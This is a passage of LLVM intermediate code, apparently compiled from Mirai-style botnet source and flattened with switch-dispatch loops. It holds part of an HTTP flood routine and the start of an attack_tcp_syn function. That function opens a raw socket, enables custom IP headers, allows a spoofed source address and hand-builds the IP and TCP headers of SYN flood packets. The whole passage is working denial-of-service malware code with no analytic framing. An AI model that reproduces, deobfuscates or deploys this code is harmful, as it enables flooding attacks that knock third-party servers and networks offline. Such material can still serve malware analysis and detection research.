  %2583 = select i1 %2582, i32 1293052235, i32 -1676408214
  store i32 %2583, i32* %switchVar
  br label %loopEnd

; <label>:2584:                                   ; preds = %loopEntry
  %2585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2585, i32 0, i32 1
  store i8 1, i8* %2586, align 4
  store i32 113065897, i32* %switchVar
  br label %loopEnd

; <label>:2587:                                   ; preds = %loopEntry
  store i32 -1234908302, i32* %switchVar
  br label %loopEnd

; <label>:2588:                                   ; preds = %loopEntry
  store i32 -1443462659, i32* %switchVar
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  %2590 = load i32, i32* %59, align 4
  %2591 = icmp eq i32 %2590, 0
  %2592 = select i1 %2591, i32 -443563555, i32 1838946904
  store i32 %2592, i32* %switchVar
  br label %loopEnd

; <label>:2593:                                   ; preds = %loopEntry
  store i32 113065897, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  %2595 = load i32, i32* %59, align 4
  %2596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2596, i32 0, i32 17
  %2598 = load i32, i32* %2597, align 4
  %2599 = sub nsw i32 %2598, %2595
  store i32 %2599, i32* %2597, align 4
  %2600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2600, i32 0, i32 18
  %2602 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2601, i32 0, i32 0
  %2603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2603, i32 0, i32 18
  %2605 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2604, i32 0, i32 0
  %2606 = load i32, i32* %59, align 4
  %2607 = sext i32 %2606 to i64
  %2608 = getelementptr inbounds i8, i8* %2605, i64 %2607
  %2609 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2610 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2609, i32 0, i32 17
  %2611 = load i32, i32* %2610, align 4
  %2612 = sext i32 %2611 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2602, i8* %2608, i64 %2612, i32 1, i1 false)
  %2613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2613, i32 0, i32 18
  %2615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2615, i32 0, i32 17
  %2617 = load i32, i32* %2616, align 4
  %2618 = sext i32 %2617 to i64
  %2619 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2614, i64 0, i64 %2618
  store i8 0, i8* %2619, align 1
  %2620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2620, i32 0, i32 17
  %2622 = load i32, i32* %2621, align 4
  %2623 = icmp eq i32 %2622, 0
  %2624 = select i1 %2623, i32 -629535802, i32 -1351372861
  store i32 %2624, i32* %switchVar
  br label %loopEnd

; <label>:2625:                                   ; preds = %loopEntry
  store i32 113065897, i32* %switchVar
  br label %loopEnd

; <label>:2626:                                   ; preds = %loopEntry
  store i32 1347562725, i32* %switchVar
  br label %loopEnd

; <label>:2627:                                   ; preds = %loopEntry
  store i32 -1747060959, i32* %switchVar
  br label %loopEnd

; <label>:2628:                                   ; preds = %loopEntry
  store i32 201635281, i32* %switchVar
  br label %loopEnd

; <label>:2629:                                   ; preds = %loopEntry
  store i32 1910821277, i32* %switchVar
  br label %loopEnd

; <label>:2630:                                   ; preds = %loopEntry
  %2631 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2632 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2631, i32 0, i32 1
  %2633 = load i8, i8* %2632, align 4
  %2634 = zext i8 %2633 to i32
  %2635 = icmp eq i32 %2634, 10
  %2636 = select i1 %2635, i32 -888961760, i32 -1684441688
  store i32 %2636, i32* %switchVar
  br label %loopEnd

; <label>:2637:                                   ; preds = %loopEntry
  store i32 1638242187, i32* %switchVar
  br label %loopEnd

; <label>:2638:                                   ; preds = %loopEntry
  %2639 = call i32* @__errno_location() #7
  store i32 0, i32* %2639, align 4
  %2640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2640, i32 0, i32 0
  %2642 = load i32, i32* %2641, align 4
  %2643 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2644 = call i64 @recv(i32 %2642, i8* %2643, i64 10240, i32 16384)
  %2645 = trunc i64 %2644 to i32
  store i32 %2645, i32* %12, align 4
  %2646 = load i32, i32* %12, align 4
  %2647 = icmp eq i32 %2646, 0
  %2648 = select i1 %2647, i32 -1249751949, i32 1630415979
  store i32 %2648, i32* %switchVar
  br label %loopEnd

; <label>:2649:                                   ; preds = %loopEntry
  %2650 = call i32* @__errno_location() #7
  store i32 104, i32* %2650, align 4
  store i32 -1, i32* %12, align 4
  store i32 1630415979, i32* %switchVar
  br label %loopEnd

; <label>:2651:                                   ; preds = %loopEntry
  %2652 = load i32, i32* %12, align 4
  %2653 = icmp eq i32 %2652, -1
  %2654 = select i1 %2653, i32 -1044151197, i32 472467169
  store i32 %2654, i32* %switchVar
  br label %loopEnd

; <label>:2655:                                   ; preds = %loopEntry
  %2656 = call i32* @__errno_location() #7
  %2657 = load i32, i32* %2656, align 4
  %2658 = icmp ne i32 %2657, 11
  %2659 = select i1 %2658, i32 790785305, i32 -467979276
  store i32 %2659, i32* %switchVar
  br label %loopEnd

; <label>:2660:                                   ; preds = %loopEntry
  %2661 = call i32* @__errno_location() #7
  %2662 = load i32, i32* %2661, align 4
  %2663 = icmp ne i32 %2662, 11
  %2664 = select i1 %2663, i32 -347148720, i32 -467979276
  store i32 %2664, i32* %switchVar
  br label %loopEnd

; <label>:2665:                                   ; preds = %loopEntry
  %2666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2666, i32 0, i32 0
  %2668 = load i32, i32* %2667, align 4
  %2669 = call i32 @close(i32 %2668)
  %2670 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2671 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2670, i32 0, i32 0
  store i32 -1, i32* %2671, align 4
  %2672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2672, i32 0, i32 1
  store i8 0, i8* %2673, align 4
  store i32 -467979276, i32* %switchVar
  br label %loopEnd

; <label>:2674:                                   ; preds = %loopEntry
  store i32 360805085, i32* %switchVar
  br label %loopEnd

; <label>:2675:                                   ; preds = %loopEntry
  store i32 1638242187, i32* %switchVar
  br label %loopEnd

; <label>:2676:                                   ; preds = %loopEntry
  %2677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2677, i32 0, i32 1
  %2679 = load i8, i8* %2678, align 4
  %2680 = zext i8 %2679 to i32
  %2681 = icmp ne i32 %2680, 0
  %2682 = select i1 %2681, i32 1814192929, i32 1050014615
  store i32 %2682, i32* %switchVar
  br label %loopEnd

; <label>:2683:                                   ; preds = %loopEntry
  %2684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2684, i32 0, i32 1
  store i8 1, i8* %2685, align 4
  store i32 1050014615, i32* %switchVar
  br label %loopEnd

; <label>:2686:                                   ; preds = %loopEntry
  store i32 -1684441688, i32* %switchVar
  br label %loopEnd

; <label>:2687:                                   ; preds = %loopEntry
  store i32 1910821277, i32* %switchVar
  br label %loopEnd

; <label>:2688:                                   ; preds = %loopEntry
  store i32 -319556250, i32* %switchVar
  br label %loopEnd

; <label>:2689:                                   ; preds = %loopEntry
  store i32 1691909124, i32* %switchVar
  br label %loopEnd

; <label>:2690:                                   ; preds = %loopEntry
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:2691:                                   ; preds = %loopEntry
  %2692 = load i32, i32* %9, align 4
  %2693 = add nsw i32 %2692, 1
  store i32 %2693, i32* %9, align 4
  store i32 2015148112, i32* %switchVar
  br label %loopEnd

; <label>:2694:                                   ; preds = %loopEntry
  store i32 2993932, i32* %switchVar
  br label %loopEnd

; <label>:2695:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2694, %2691, %2690, %2689, %2688, %2687, %2686, %2683, %2676, %2675, %2674, %2665, %2660, %2655, %2651, %2649, %2638, %2637, %2630, %2629, %2628, %2627, %2626, %2625, %2594, %2593, %2589, %2588, %2587, %2584, %2571, %2570, %2564, %2561, %2553, %2543, %2522, %2512, %2506, %2500, %2499, %2498, %2493, %2406, %2397, %2364, %2353, %2342, %2338, %2334, %2325, %2319, %2310, %2309, %2300, %2295, %2290, %2286, %2284, %2261, %2249, %2243, %2242, %2235, %2234, %2227, %2218, %2217, %2214, %2211, %2206, %2203, %2195, %2184, %2183, %2182, %2175, %2174, %2173, %2172, %2161, %2148, %2139, %2132, %2131, %2130, %2119, %2106, %2097, %2091, %2086, %2081, %2078, %2073, %2064, %2055, %2045, %2042, %2035, %2024, %2022, %2020, %2013, %2009, %2005, %2002, %2001, %1988, %1969, %1960, %1947, %1934, %1931, %1916, %1907, %1904, %1902, %1894, %1885, %1876, %1868, %1865, %1858, %1846, %1843, %1831, %1824, %1823, %1820, %1819, %1818, %1807, %1798, %1785, %1778, %1777, %1776, %1765, %1752, %1743, %1737, %1732, %1727, %1724, %1719, %1710, %1701, %1691, %1688, %1681, %1668, %1665, %1658, %1646, %1643, %1631, %1624, %1620, %1619, %1618, %1617, %1602, %1597, %1593, %1590, %1589, %1588, %1576, %1569, %1567, %1558, %1555, %1554, %1553, %1544, %1538, %1530, %1515, %1499, %1496, %1487, %1470, %1467, %1450, %1448, %1443, %1433, %1432, %1429, %1428, %1418, %1415, %1408, %1396, %1393, %1381, %1374, %1373, %1372, %1369, %1356, %1353, %1346, %1334, %1331, %1319, %1310, %1309, %1308, %1305, %1292, %1289, %1282, %1270, %1267, %1255, %1246, %1243, %1236, %1233, %1221, %1220, %1216, %1210, %1201, %1191, %1184, %1166, %1165, %1156, %1153, %1149, %1140, %1122, %1121, %1111, %1106, %1105, %1104, %1094, %1093, %1089, %1086, %1085, %1084, %1083, %1082, %1081, %1080, %1079, %1070, %1061, %1054, %1053, %1048, %1026, %1019, %1018, %1013, %991, %984, %983, %978, %956, %949, %948, %943, %908, %900, %890, %882, %872, %865, %862, %843, %836, %829, %823, %782, %669, %662, %661, %656, %634, %625, %617, %610, %609, %604, %546, %545, %539, %534, %527, %520, %519, %516, %513, %507, %496, %491, %490, %481, %480, %471, %468, %467, %464, %455, %NewDefault, %446, %437, %428, %419, %410, %401, %392, %383, %374, %365, %356, %347, %338, %329, %320, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %LeafBlock19, %NodeBlock21, %NodeBlock23, %NodeBlock25, %NodeBlock27, %301, %271, %234, %206, %163, %158, %153, %152, %148, %145, %144, %135, %126, %117, %111, %110, %109, %104, %103, %98, %97, %92, %91, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

declare i64 @send(i32, i8*, i64, i32) #4

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 805137461, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 805137461, label %first
    i32 -810489247, label %99
    i32 1821976954, label %100
    i32 867546801, label %106
    i32 1014797682, label %109
    i32 852617829, label %110
    i32 -1162209296, label %116
    i32 1859372418, label %160
    i32 -196004522, label %164
    i32 1157217168, label %289
    i32 520676776, label %292
    i32 228559550, label %293
    i32 -845707136, label %294
    i32 1732263867, label %300
    i32 51587168, label %320
    i32 1685332250, label %341
    i32 796021992, label %345
    i32 332991910, label %349
    i32 192012467, label %354
    i32 -1701857255, label %360
    i32 166688214, label %365
    i32 1944136709, label %371
    i32 -1344127773, label %376
    i32 113387932, label %382
    i32 -685668501, label %386
    i32 695105844, label %390
    i32 -131682540, label %394
    i32 -1682630466, label %398
    i32 -269549303, label %402
    i32 1139348391, label %408
    i32 -1940824251, label %446
    i32 -1414586091, label %449
    i32 1190106080, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 -810489247, i32 1821976954
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 1190106080, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 867546801, i32 1014797682
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1190106080, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 852617829, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 -1162209296, i32 520676776
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1859372418, i32 -196004522
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 -196004522, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
